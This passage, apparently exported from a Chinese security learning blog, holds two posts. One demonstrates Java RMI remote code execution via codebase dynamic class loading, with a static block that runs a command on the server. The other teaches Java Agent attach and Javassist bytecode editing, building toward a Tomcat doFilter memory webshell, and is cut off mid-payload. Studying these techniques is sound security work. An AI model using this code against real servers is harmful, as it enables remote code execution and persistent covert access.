Naming.lookup(RMI_NAME); String result = rt.test(li);//远程调用触发点，在这里触发从cosebase中读取class文件执行！！ System.out.println(result); } public static void main(String[] args) { try { new RMIClientDemo().lookup(); } catch (Exception e) { e.printStackTrace(); } } } 本地只有一个抽象接口，所以Right6具体是从cosebase获取的class文件 RMIInterfaceDemo.java package com.sec.rmi; import java.rmi.Remote; import java.rmi.RemoteException; import java.util.List; /** * RMI测试接口 */ public interface RMIInterfaceDemo extends Remote { /** * RMI测试方法 * * @return 返回测试字符串 */ String test(List&lt;Integer&gt; params) throws RemoteException; } 服务端 windows：192.168.159.1 RMIImplDemo.java package com.sec.rmi; import java.util.List; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class RMIImplDemo extends UnicastRemoteObject implements RMIInterfaceDemo { private static final long serialVersionUID = 1L; protected RMIImplDemo() throws RemoteException { super(); } /** * RMI测试方法 * * @return 返回测试字符串 */ @Override public String test(List&lt;Integer&gt; params) throws RemoteException { return &quot;Hello 6right~&quot;; } } RMlInterfaceDemo.java 和客户端的一致 RMIServerDemo.java package com.sec.rmi; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class RMIServerDemo { public static final String RMI_HOST = &quot;192.168.159.1&quot;; public static final int RMI_PORT = 9527; public static final String RMI_NAME = &quot;rmi://&quot; + RMI_HOST + &quot;:&quot; + RMI_PORT + &quot;/test&quot;; public static void main(String[] args) throws Exception { //设置安全策略 if (System.getSecurityManager() == null) { System.out.println(&quot;setup SecurityManager&quot;); System.setSecurityManager(new SecurityManager()); } LocateRegistry.createRegistry(RMI_PORT); Naming.bind(RMI_NAME, new RMIImplDemo()); System.out.println(&quot;RMI服务启动成功,服务地址:&quot; + RMI_NAME); } } 1.policy 开放所有权限 grant { permission java.security.AllPermission; }; tips:policy文件放在工作目录下,服务端传参调用-Djava.security.policy=1.policy 客户端调用 java -Djava.rmi.server.codebase=http://x.x.x.x:x/ com.sec.rmi.RMIClientDemo vps成功收到请求 接下来直接利用，将RMIClientDemo加入恶意代码 package com.sec.rmi; import java.io.Serializable; import java.rmi.Naming; import java.util.ArrayList; import java.util.List; public class RMIClientDemo implements Serializable { private static final long serialVersionUID = 1L; static { try{ Runtime.getRuntime().exec(&quot;calc&quot;); } catch (Exception e){ e.printStackTrace(); } } public static final String RMI_HOST = &quot;192.168.159.1&quot;; public static final int RMI_PORT = 9527; public static final String RMI_NAME = &quot;rmi://&quot; + RMI_HOST + &quot;:&quot; + RMI_PORT + &quot;/test&quot;; public class Right6 extends ArrayList&lt;Integer&gt; {} public void lookup() throws Exception { List&lt;Integer&gt; li = new Right6(); RMIInterfaceDemo rt = (RMIInterfaceDemo) Naming.lookup(RMI_NAME); String result = rt.test(li);//远程调用触发点，在这里触发从cosebase中读取class文件执行！！ System.out.println(result); } public static void main(String[] args) { try { new RMIClientDemo().lookup(); } catch (Exception e) { e.printStackTrace(); } } } 开启httpserver python -m SimpleHTTPServer 8000 客户端重新发起恶意请求，服务端成功执行 简单流程 客户端在调用时，传递了一个可序列化对象，这个对象在服务端不存在，则在服务端会抛出 ClassNotFound 的异常，但是 RMI 支持动态类加载，如果设置了 java.rmi.server.codebase，则会尝试从其中的地址获取 .class 并加载及反序列化。当其中包含恶意代码片段时执行达到远程RCE 总结 简单学习了 RMI的基础知识 ，通过Demo了解了RMI 的使用，分析了 RMI 实现的部分流程，针对 RMI 中Clinet端攻击Server端进行了Demo测试。 其实剩下来的知识点还很多，后面写的话还会更一篇文章。 JEP290学习及绕过 RMI利用JRMP协议漏洞 Server攻击Client端(反制) Registry端的攻击 参考 https://javasec.org/javase/RMI/ https://su18.org/post/rmi-attack/ p牛java漫谈 ","link":"https://liangyueliangyue.github.io/post/javasec-rmi/"},{"title":"JavaSec-Agent","content":"介绍 JDK1.5开始，Java新增了Instrumentation(Java Agent API)和JVMTI(JVM Tool Interface)功能，允许JVM在加载某个class文件之前对其字节码进行修改，同时也支持对已加载的class(类字节码)进行重新加载(Retransform)。 利用Java Agent这一特性衍生出了APM(Application Performance Management，应用性能管理)、RASP(Runtime application self-protection，运行时应用自我保护)、IAST(Interactive Application Security Testing，交互式应用程序安全测试)等相关产品，它们都无一例外的使用了Instrumentation/JVMTI的API来实现动态修改Java类字节码并插入监控或检测代码。 JavaAgent其实也就是一个 Jar 包，只是启动方式和普通 Jar 包有所不同，对于普通的Jar包，通过指定类的 main 函数进行启动，但是 Java Agent 并不能单独启动，必须依附在一个 Java 应用程序运行。而它的启动方法共有两种，一种的方法是premain,一种是agentmain。 jvm方式：实现 premain方法，在主函数执行前加载。// 当我们提供的 agent 属于基础必备服务时，可以用这种方式 attach方法：实现 agentmain方法，在主函数执行后加载。// 我们的 agent 用来 debug 定位问题，就可以用这种方式 其中 jvm方式，也就是说要使用这个 agent 的目标应用，在启动的时候，需要指定 jvm 参数-javaagent:xxx.jar。 而当目标应用程序启动之后，没有添加 -javaagent 加载我们的 agent，但我们希望目标程序使用我们的 agent，这时候就可以使用 attach 方式来使用。 这两种运行方式的最大区别在于第一种方式只能在程序启动时指定Agent文件，而attach方式可以在Java程序运行后根据进程ID动态注入Agent到JVM。 特性 Java Agent和普通的Java类并没有任何区别，普通的Java程序中规定了main方法为程序入口，而Java Agent则将premain（Agent模式）和agentmain（Attach模式）作为了Agent程序的入口，两者所接受的参数是完全一致的，如下： public static void premain(String args, Instrumentation inst) {} public static void agentmain(String args, Instrumentation inst) {} Java Agent还限制了我们必须以jar包的形式运行或加载，我们必须将编写好的Agent程序打包成一个jar文件。除此之外，Java Agent还强制要求了所有的jar文件中必须包含/META-INF/MANIFEST.MF文件，且该文件中必须定义好Premain-Class（Agent模式）或Agent-Class:（Agent模式）配置，如： Premain-Class: com.anbai.sec.agent.CrackLicenseAgent Agent-Class: com.anbai.sec.agent.CrackLicenseAgent 如果我们需要修改已经被JVM加载过的类的字节码，那么还需要设置在MANIFEST.MF中添加Can-Retransform-Classes: true或Can-Redefine-Classes: true。 简单例子 IDEA 作为编辑器 maven 进行包管理 首先新建project 新建一个SimpleAgent类 public class SimpleAgent { /** * jvm 参数形式启动，运行此方法 * * @param agentArgs * @param inst */ public static void premain(String agentArgs, Instrumentation inst) { System.out.println(&quot;premain&quot;); } /** * 动态 attach 方式启动，运行此方法 * * @param agentArgs * @param inst */ public static void agentmain(String agentArgs, Instrumentation inst) { System.out.println(&quot;agentmain&quot;); } } 通过配置文件MANIFEST.MF打包 在main/资源目录(Resources)下，新建目录META-INF 在META-INF目录下，新建文件MANIFEST.MF 文件内容如下 Manifest-Version: 1.0 Premain-Class: com.agent.SimpleAgent Agent-Class: com.agent.SimpleAgent Can-Redefine-Classes: true Can-Retransform-Classes: true 请注意，最后的一个空行不能少，在 idea 中，删除最后一行时，会有错误提醒 然后我们的pom.xml配置，需要作出对应的修改 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;Java_agent&lt;/groupId&gt; &lt;artifactId&gt;Java_agent&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;descriptorRefs&gt; &lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt; &lt;/descriptorRefs&gt; &lt;archive&gt; &lt;manifestFile&gt; src/main/resources/META-INF/MANIFEST.MF &lt;/manifestFile&gt; &lt;!--&lt;manifestEntries&gt;--&gt; &lt;!--&lt;Premain-Class&gt;com.git.hui.agent.SimpleAgent&lt;/Premain-Class&gt;--&gt; &lt;!--&lt;Agent-Class&gt;com.git.hui.agent.SimpleAgent&lt;/Agent-Class&gt;--&gt; &lt;!--&lt;Can-Redefine-Classes&gt;true&lt;/Can-Redefine-Classes&gt;--&gt; &lt;!--&lt;Can-Retransform-Classes&gt;true&lt;/Can-Retransform-Classes&gt;--&gt; &lt;!--&lt;/manifestEntries&gt;--&gt; &lt;/archive&gt; &lt;/configuration&gt; &lt;executions&gt; &lt;execution&gt; &lt;goals&gt; &lt;goal&gt;attached&lt;/goal&gt; &lt;/goals&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;/project&gt; 通过mvn assembly:assembly命令打包 得到结果 再写一个测试类 public static void main(String[] args) throws InterruptedException { int i =0; while (true){ i += 2; System.out.println(&quot;i: &quot; + i); Thread.sleep(1000); } } jvm IDEA 测试时，可以直接在配置类，添加 jvm 参数，如下 agent 绝对地址: -javaagent:*/java-agent-1.0-SNAPSHOT-jar-with-dependencies.jar 可以看到成功在main函数执行前加载执行了premain函数 这种方法存在一定的局限性——只能在启动时使用-javaagent参数指定。在实际环境中，目标的JVM通常都是已经启动的状态，无法预先加载premain。相比之下，agentmain更加实用。 attach 在使用 attach 方式时，可以简单的理解为要将我们的 agent 注入到目标的应用程序中，所以我们需要自己起一个程序来完成这件事情 package com.agent; import com.sun.tools.attach.AgentInitializationException; import com.sun.tools.attach.AgentLoadException; import com.sun.tools.attach.AttachNotSupportedException; import com.sun.tools.attach.VirtualMachine; import java.io.IOException; public class AttachDemo { public static void main(String[] args) throws IOException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, IOException, AgentLoadException, AgentInitializationException { VirtualMachine vm = VirtualMachine.attach(&quot;24840&quot;); vm.loadAgent(&quot;D:\\\\Java_location\\\\Java_agent\\\\target\\\\Java_agent-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;); } } 注意：这里的tools包需要自己导入 VirtualMachine VirtualMachine 可以来实现获取系统信息，内存dump、现成dump、类信息统计（例如JVM加载的类）。里面配备有几个方法LoadAgent，Attach 和 Detach 。下面来看看这几个方法的作用 Attach ：该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上 VirtualMachine vm = VirtualMachine.attach(v.id()); loadAgent：向jvm注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理。 Detach：从 JVM 上面解除一个代理(agent) 上面的逻辑比较简单，首先通过jps -l获取目标应用的进程号 jps 命令类似与 linux 的 ps 命令，但是它只列出系统中所有的 Java 应用程序。 通过 jps 命令可以方便地查看 Java 进程的启动类、传入参数和 Java 虚拟机参数等信息。 修改进程id后运行AttachDemo后，可以看到循环中执行了一次agentmain函数，表明 agent 被成功注入进去 进阶 Instrumentation Instrumentation是JVMTIAgent（JVM Tool Interface Agent）的一部分。Java agent通过这个类和目标JVM进行交互，从而达到修改数据的效果。 java.lang.instrument.Instrumentation是监测运行在JVM程序的Java API，利用Instrumentation我们可以实现如下功能： 动态添加或移除自定义的ClassFileTransformer（addTransformer/removeTransformer），JVM会在类加载时调用Agent中注册的ClassFileTransformer； 动态修改classpath（appendToBootstrapClassLoaderSearch、appendToSystemClassLoaderSearch），将Agent程序添加到BootstrapClassLoader和SystemClassLoaderSearch（对应的是ClassLoader类的getSystemClassLoader方法，默认是sun.misc.Launcher$AppClassLoader）中搜索； 动态获取所有JVM已加载的类(getAllLoadedClasses)； 动态获取某个类加载器已实例化的所有类(getInitiatedClasses)。 重定义某个已加载的类的字节码(redefineClasses)。 动态设置JNI前缀(setNativeMethodPrefix)，可以实现Hook native方法。 重新加载某个已经被JVM加载过的类字节码retransformClasses)。 Instrumentation类方法如下： ClassFileTransformer java.lang.instrument.ClassFileTransformer是一个转换类文件的代理接口，我们可以在获取到Instrumentation对象后通过addTransformer方法添加自定义类文件转换器。 ClassFileTransformer类代码： package java.lang.instrument; public interface ClassFileTransformer { /** * 类文件转换方法，重写transform方法可获取到待加载的类相关信息 * * @param loader 定义要转换的类加载器；如果是引导加载器，则为 null * @param className 类名,如:java/lang/Runtime * @param classBeingRedefined 如果是被重定义或重转换触发，则为重定义或重转换的类；如果是类加载，则为 null * @param protectionDomain 要定义或重定义的类的保护域 * @param classfileBuffer 类文件格式的输入字节缓冲区（不得修改） * @return 字节码byte数组。 */ byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer); } 简单了解一下： 使用Instrumentation.addTransformer()来加载一个转换器。 转换器的返回结果（transform()方法的返回值）将成为转换后的字节码。 对于没有加载的类，会使用ClassLoader.defineClass()定义它；对于已经加载的类，会使用ClassLoader.redefineClasses()重新定义，并配合Instrumentation.retransformClasses进行转换。 其实就是对每个类（已经加载/没有加载）调用Instrumentation转换器，让其返回转换后的字节码，然后通过javassist修改class字节码 重写transform方法需要注意以下事项： ClassLoader如果是被Bootstrap ClassLoader(引导类加载器)所加载那么loader参数的值是空。 修改类字节码时需要特别注意插入的代码在对应的ClassLoader中可以正确的获取到，否则会报ClassNotFoundException，比如修改java.io.FileInputStream(该类由Bootstrap ClassLoader加载)时插入了我们检测代码，那么我们将必须保证FileInputStream能够获取到我们的检测代码类。 JVM类名的书写方式路径方式：java/lang/String而不是我们常用的类名方式：java.lang.String。 类字节必须符合JVM校验要求，如果无法验证类字节码会导致JVM崩溃或者VerifyError(类验证错误)。 如果修改的是retransform类(修改已被JVM加载的类)，修改后的类字节码不得新增方法、修改方法参数、类成员变量。 addTransformer时如果没有传入retransform参数(默认是false)就算MANIFEST.MF中配置了Can-Redefine-Classes: true而且手动调用了retransformClasses方法也一样无法retransform。 卸载transform时需要使用创建时的Instrumentation实例。 简单实现 添加一个新的Transformer类 新建一个名为TestTransformer的类，内容入下： package com.agent; import java.lang.instrument.ClassFileTransformer; import java.lang.instrument.IllegalClassFormatException; import java.security.ProtectionDomain; public class TestTransformer implements ClassFileTransformer { @Override public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException { System.out.println(className.replace(&quot;/&quot;, &quot;.&quot;)); return classfileBuffer; } } 重写了TestTransformer方法，返回值不变，打印出类名 添加之前的simple测试类中agentmain/premain函数内容 inst.addTransformer(new TestTransformer()); 可以看到打印出了很多类的类名 由此可见，java agent还能有更多用法可以拓展，比如性能监控，日志监控、管理会话、安全过滤、请求管理等。 字节码操作 上面已经知道了java agent可以对每个类（已经加载/没有加载）调用Instrumentation转换器，让其返回转换后的字节码 那么我们只需要通过javassist/ASM修改class字节码就可以达到注入内存马的效果了 ASM ASM是一种通用Java字节码操作和分析框架，它可以直接以二进制形式修改一个现有的类或动态生成类文件。ASM的版本更新快（ASM 9.0已经支持JDK 16）、性能高、功能全，学习成本也相对较高，ASM官方用户手册：ASM 4.0 A Java bytecode engineering library。 ASM相对于javassist更底层，javassist是asm的封装，效率也更高，但比较复杂，后续可能会专门写一篇文章来学习 javassist javassist 简介 Javassist是一个开源的分析、编辑和创建Java字节码的类库；相比ASM，Javassist提供了更加简单便捷的API，使用Javassist我们可以像写Java代码一样直接插入Java代码片段，让我们不再需要关注Java底层的字节码的和栈操作，仅需要学会如何使用Javassist的API即可实现字节码编辑。学习Javassist可以阅读官方的入门教程：Getting Started with Javassist。 我们常用到的动态特性主要是反射，在运行时查找对象属性、方法，修改作用域，通过方法名称调用方法等。在线的应用不会频繁使用反射，因为反射的性能开销较大。其实还有一种和反射一样强大的特性，但是开销却很低，它就是Javassist。 与其他类似的字节码编辑器不同, Javassist 提供了两个级别的 API: 源级别和字节码级别。 如果用户使用源级 API, 他们可以编辑类文件, 而不知道 Java 字节码的规格。 整个 API 只用 Java 语言的词汇来设计。 您甚至可以以源文本的形式指定插入的字节码; Javassist 在运行中编译它。 另一方面, 字节码级 API 允许用户直接编辑类文件作为其他编辑器。 Javassist API和标识符 Javassist为我们提供了类似于Java反射机制的API，如：CtClass，CtConstructor、CtMethod、CtField与Java反射的Class、Constructor、Method、Field非常的类似。 类 描述 ClassPool ClassPool是一个存储CtClass的容器，如果调用get方法会搜索并创建一个表示该类的CtClass对象 CtClass CtClass表示的是从ClassPool获取的类对象，可对该类就行读写编辑等操作 CtMethod 可读写的类方法对象 CtConstructor 可读写的类构造方法对象 CtField 可读写的类成员变量对象 Javassist使用了内置的标识符来表示一些特定的含义，如：$_表示返回值。我们可以在动态插入类代码的时候使用这些特殊的标识符来表示对应的对象。 表达式 描述 $0, $1, $2, ... this和方法参数 $args Object[]类型的参数数组 $$ 所有的参数，如m($$)等价于m($1,$2,...) $cflow(...) cflow变量 $r 返回类型，用于类型转换 $w 包装类型，用于类型转换 $_ 方法返回值 $sig 方法签名，返回java.lang.Class[]数组类型 $type 返回值类型，java.lang.Class类型 $class 当前类，java.lang.Class类型 想要系统的学习可以看官方教程 读取类/成员变量/方法信息 Javassist读取类信息非常简单，使用ClassPool对象获取到CtClass对象后就可以像使用Java反射API一样去读取类信息了。 首先maven导入 &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.javassist&lt;/groupId&gt; &lt;artifactId&gt;javassist&lt;/artifactId&gt; &lt;version&gt;3.26.0-GA&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 也可以官网下载jar包，导入module，library http://www.javassist.org/ Student学生类实例 package com.agent; import java.io.Serializable; public class Student implements Serializable { private String name; private int age; public String address; public Student() { } private Student(String name){ this.name = name; } Student(String name ,int age){ this.name = name; this.age = age; } public Student(String name,int age,String address){ this.name = name; this.age = age; this.address = address; } private void function(){ System.out.println(&quot;function&quot;); } public void method1(){ System.out.println(&quot;method&quot;); } public void method2(String s){ System.out.println(&quot;method&quot; + s); } public String method3(String s,int i){ return s + &quot;,&quot; + i; } @Override public String toString() { return &quot;Student{&quot; + &quot;name='&quot; + name + '\\'' + &quot;, age=&quot; + age + &quot;, address='&quot; + address + '\\'' + '}'; } } Javassist读取类信息示例代码： package com.agent; import javassist.*; import java.util.Arrays; public class JavassistDemo1 { public static void main(String[] args) { // 创建ClassPool对象 ClassPool classPool = ClassPool.getDefault(); try { CtClass ctClass = classPool.get(&quot;com.agent.Student&quot;); System.out.println( &quot;解析类名：&quot; + ctClass.getName() + &quot;，父类：&quot; + ctClass.getSuperclass().getName() + &quot;，实现接口：&quot; + Arrays.toString(ctClass.getInterfaces()) ); System.out.println(&quot;-----------------------------------------------------------------------------&quot;); // 获取所有的构造方法 CtConstructor[] ctConstructors = ctClass.getDeclaredConstructors(); // 获取所有的成员变量 CtField[] ctFields = ctClass.getDeclaredFields(); // 获取所有的成员方法 CtMethod[] ctMethods = ctClass.getDeclaredMethods(); // 输出所有的构造方法 for (CtConstructor ctConstructor : ctConstructors) { System.out.println(ctConstructor.getMethodInfo()); } System.out.println(&quot;-----------------------------------------------------------------------------&quot;); // 输出所有成员变量 for (CtField ctField : ctFields) { System.out.println(ctField); } System.out.println(&quot;-----------------------------------------------------------------------------&quot;); // 输出所有的成员方法 for (CtMethod ctMethod : ctMethods) { System.out.println(ctMethod); } } catch (NotFoundException e) { e.printStackTrace(); } } } 程序执行结果： 解析类名：com.agent.Student，父类：java.lang.Object，实现接口：[javassist.CtClassType@7530d0a[public abstract interface class java.io.Serializable fields= constructors= methods=]] ----------------------------------------------------------------------------- &lt;init&gt; ()V &lt;init&gt; (Ljava/lang/String;)V &lt;init&gt; (Ljava/lang/String;I)V &lt;init&gt; (Ljava/lang/String;ILjava/lang/String;)V ----------------------------------------------------------------------------- com.agent.Student.name:Ljava/lang/String; com.agent.Student.age:I com.agent.Student.address:Ljava/lang/String; ----------------------------------------------------------------------------- javassist.CtMethod@fc41e2d9[private function ()V] javassist.CtMethod@cd0f3471[public method1 ()V] javassist.CtMethod@bcf01e28[public method2 (Ljava/lang/String;)V] javassist.CtMethod@67996580[public method3 (Ljava/lang/String;I)Ljava/lang/String;] javassist.CtMethod@69cb6c6d[public toString ()Ljava/lang/String;] 修改类方法 Javassist实现类方法修改只需要调用CtMethod类的对应的API就可以了。CtMethod提供了类方法修改的API，如：setModifiers可修改类的访问修饰符，insertBefore和insertAfter能够实现在类方法执行的前后插入任意的Java代码片段，setBody可以修改整个方法的代码等。 Javassist修改类方法示例代码： package com.agent; import javassist.ClassPool; import javassist.CtClass; import javassist.CtMethod; import javassist.Modifier; import org.apache.commons.io.FileUtils; import java.io.File; public class JavassistDemo2 { public static void main(String[] args) { // 创建ClassPool对象 ClassPool classPool = ClassPool.getDefault(); try { CtClass ctClass = classPool.get(&quot;com.agent.Student&quot;); // 获取method3方法 CtMethod helloMethod = ctClass.getDeclaredMethod(&quot;method3&quot;); // 修改方法的访问权限为private helloMethod.setModifiers(Modifier.PRIVATE); // 添加方法内容到最前，打印方法的第一个参数值 helloMethod.insertBefore(&quot;System.out.println($1);&quot;); // 添加方法内容到最后，打印方法的返回值并返回Return:返回值 helloMethod.insertAfter(&quot;System.out.println($_); return \\&quot;Return:\\&quot; + $_;&quot;); File classFilePath = new File(new File(System.getProperty(&quot;user.dir&quot;), &quot;test&quot;), &quot;Test.class&quot;); // 使用类CtClass，生成类二进制 byte[] bytes = ctClass.toBytecode(); // 将class二进制内容写入到类文件 FileUtils.writeByteArrayToFile(classFilePath, bytes); } catch (Exception e) { e.printStackTrace(); } } } 生成Test.class文件 // // Source code recreated from a .class file by IntelliJ IDEA // (powered by Fernflower decompiler) // package com.agent; import java.io.Serializable; public class Student implements Serializable { private String name; private int age; public String address; public Student() { } private Student(String name) { this.name = name; } Student(String name, int age) { this.name = name; this.age = age; } public Student(String name, int age, String address) { this.name = name; this.age = age; this.address = address; } private void function() { System.out.println(&quot;function&quot;); } public void method1() { System.out.println(&quot;method&quot;); } public void method2(String s) { System.out.println(&quot;method&quot; + s); } private String method3(String s, int i) { System.out.println(s); String var4 = s + &quot;,&quot; + i; System.out.println(var4); return &quot;Return:&quot; + var4; } public String toString() { return &quot;Student{name='&quot; + this.name + '\\'' + &quot;, age=&quot; + this.age + &quot;, address='&quot; + this.address + '\\'' + '}'; } } 创建Java类二进制 假设我们需要生成一个JavassistHelloWorld类，代码如下： package com.agent; public class JavassistHelloWorld { private static String content = &quot;Hello world~&quot;; public static void main(String[] args) { System.out.println(content); } } 使用Javassist生成类字节码示例： package com.agent; import javassist.ClassPool; import javassist.CtClass; import javassist.CtField; import javassist.CtMethod; import org.apache.commons.io.FileUtils; import java.io.File; public class JavassistDemo3 { public static void main(String[] args) { // 创建ClassPool对象 ClassPool classPool = ClassPool.getDefault(); // 使用ClassPool创建一个JavassistHelloWorld类 CtClass ctClass = classPool.makeClass(&quot;com.agent.JavassistHelloWorld&quot;); try { // 创建类成员变量content CtField ctField = CtField.make(&quot;private static String content = \\&quot;Hello world~\\&quot;;&quot;, ctClass); // 将成员变量添加到ctClass对象中 ctClass.addField(ctField); // 创建一个主方法并输出content对象值 CtMethod ctMethod = CtMethod.make( &quot;public static void main(String[] args) {System.out.println(content);}&quot;, ctClass ); // 将成员方法添加到ctClass对象中 ctClass.addMethod(ctMethod); File classFilePath = new File(new File(System.getProperty(&quot;user.dir&quot;), &quot;test&quot;), &quot;JavassistHelloWorld.class&quot;); // 使用类CtClass，生成类二进制 byte[] bytes = ctClass.toBytecode(); // 将class二进制内容写入到类文件 FileUtils.writeByteArrayToFile(classFilePath, bytes); } catch (Exception e) { e.printStackTrace(); } } } 生成的JavassistHelloWorld.class package com.agent; public class JavassistHelloWorld { private static String content = &quot;Hello world~&quot;; public static void main(String[] var0) { System.out.println(content); } public JavassistHelloWorld() { } } 内存马 已知在tomcat下注册内存马的方式很多 动态注册servlet 动态注册filter 动态注册listener 但是我们常用的webshell管理工具冰蝎/哥斯拉往往都是通过Java agent拦截修改关键类字节码实现内存shell 该方式不会生成新的Servlet，Filter，Listener对象，因此隐蔽性更强。 唯一美中不足的是，需要生成Agent文件落地，有可能会被IDS文件检测检测到Agent。 为什么？ 通过拦截修改关键类的字节码，只需要寻找到关键类做处理即可，进而最大程度实现一套代码通用（理论上）。 怎么利用agent实现内存马？ 由于实际环境中我们通常遇到的都是已经启动着的，所以 premain 那种方法不合适内存马注入，所以我们这里利用 agentmain 方法来尝试注入我们的内存马 利用JavaAgent的agentmain方法在Instrumentation转换器的过程中通过javassist修改class字节码 简单原理 接下来我们来做一个简单的内存马原理实验。 首先我们写一个程序，在执行方法后等待输入，当我们注入JavaAgent后在进行重新执行。 MemshellDemo1.java package com.agent; import java.util.Scanner; public class MemshellDemo1 { public static void main(String[] args) { while (true){ Hello h1 = new Hello(); h1.test(); Scanner sc = new Scanner(System.in); sc.next(); } } } Hello.java package com.agent; public class Hello { public void test() { System.out.println(&quot;lyy9&quot;); } } 接下来我们开始写JavaAgent 修改之前的agentmain和premain函数，先获取所有已经加载的类，然后做一个循环判断类是否已经加载，之后添加Transformer，然后在通过retransformClasses触发过滤已加载的类。 JavassistTest.java（agentmain） package com.agent; import java.lang.instrument.Instrumentation; import java.lang.instrument.UnmodifiableClassException; public class SimpleAgent { /** * jvm 参数形式启动，运行此方法 * * @param agentArgs * @param inst */ public static void premain(String agentArgs, Instrumentation inst) { System.out.println(&quot;premain&quot;); inst.addTransformer(new TransformerDemo1()); } /** * 动态 AttachDemo 方式启动，运行此方法 * * @param agentArgs * @param inst */ public static void agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException { System.out.println(&quot;agentmain&quot;); Class[] classes = inst.getAllLoadedClasses(); // 判断类是否已经加载 for (Class aClass : classes) { if (aClass.getName().equals(TransformerDemo1.editClassName)) { // 添加 Transformer inst.addTransformer(new TransformerDemo1(), true); // 触发 Transformer inst.retransformClasses(aClass); } } } } 我们的修改TransformerTransformerDemo1.java package com.agent; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import javassist.CtMethod; import java.lang.instrument.ClassFileTransformer; import java.lang.instrument.IllegalClassFormatException; import java.security.ProtectionDomain; public class TransformerDemo1 implements ClassFileTransformer { public static final String editClassName = &quot;com.agent.Hello&quot;; public static final String editMethod = &quot;test&quot;; @Override public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException { try { //使用 JVM 的类搜索路径 ClassPool cp = ClassPool.getDefault(); if (classBeingRedefined != null) { //如果存在重定义的类，添加额外的类搜索路径 ClassClassPath ccp = new ClassClassPath(classBeingRedefined); cp.insertClassPath(ccp); } //获取我们需要的Class对象 CtClass ctc = cp.get(editClassName); //获取我们需要的Method对象 CtMethod method = ctc.getDeclaredMethod(editMethod); String source = &quot;{System.out.println(\\&quot;hello lyy9,this is test!\\&quot;);}&quot;; //setBody：设置方法体 //insertBefore：插入在方法体最前面 //insertAfter：插入在方法体最后面 //insertAt：在方法体的某一行插入内容 method.setBody(source); //获得修改过的类文件 byte[] bytes = ctc.toBytecode(); ctc.detach(); return bytes; } catch (Exception e){ e.printStackTrace(); } return null; } } 重新打包，然后运行MemshellDemo1，正常获取 在通过jps获得进程号利用attach方法修改 package com.agent; import com.sun.tools.attach.AgentInitializationException; import com.sun.tools.attach.AgentLoadException; import com.sun.tools.attach.AttachNotSupportedException; import com.sun.tools.attach.VirtualMachine; import java.io.IOException; public class AttachDemo { public static void main(String[] args) throws IOException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, IOException, AgentLoadException, AgentInitializationException { VirtualMachine vm = VirtualMachine.attach(&quot;18588&quot;); vm.loadAgent(&quot;D:\\\\Java_location\\\\Java_agent\\\\target\\\\Java_agent-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;); } } 成功attach，再次输入，方法内容被修改 实战实现 现在的问题？ 修改哪个关键类的字节码？ 对于第一个问题，其实之前分析过tomcat下的Fliter内存马 知道当请求到达Servlet之前，一定会经过 Filter ，以此来对我们的请求进行过滤，其中存在一个关键函doFilter org.apache.catalina.core.ApplicationFilterChain#doFilter doFilter 函数作用是依次调用 Filter 链上的 Filter，所以 doFilter 函数是一定会被调用的 该方法有ServletRequest和ServletResponse两个参数，里面封装了请求的request和response。如果我们能够注入该方法，那么我们不就可以直接获取用户的请求，将执行结果写在 response 中进行返回 SimpleAgent.java package agent.memshell; import java.lang.instrument.Instrumentation; public class SimpleAgent { public static String ClassName = &quot;org.apache.catalina.core.ApplicationFilterChain&quot;; public static void agentmain(String args, Instrumentation inst) throws Exception { inst.addTransformer(new MyTransformer(), true); Class[] loadedClasses = inst.getAllLoadedClasses(); for (int i = 0; i &lt; loadedClasses.length; ++i) { Class clazz = loadedClasses[i]; if (clazz.getName().equals(ClassName)) { try { inst.retransformClasses(new Class[]{clazz}); } catch (Exception e) { e.printStackTrace(); } } } } public static void premain(String args, Instrumentation inst) throws Exception { } } MyTransformer.java package agent.memshell; import javassist.*; import java.io.IOException; import java.lang.instrument.ClassFileTransformer; import java.security.ProtectionDomain; public class MyTransformer implements ClassFileTransformer { public static String ClassName = &quot;org.apache.catalina.core.ApplicationFilterChain&quot;; @Override public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; aClass, ProtectionDomain protectionDomain, byte[] classfileBuffer) { className = className.replace('/', '.'); if (className.equals(ClassName)) { ClassPool cp = ClassPool.getDefault(); if (aClass != null) { ClassClassPath classPath = new ClassClassPath(aClass); cp.insertClassPath(classPath); } CtClass cc; try { cc = cp.get(className); CtMethod m = cc.getDeclaredMethod(&quot;doFilter&quot;); m.insertBefore(&quot; 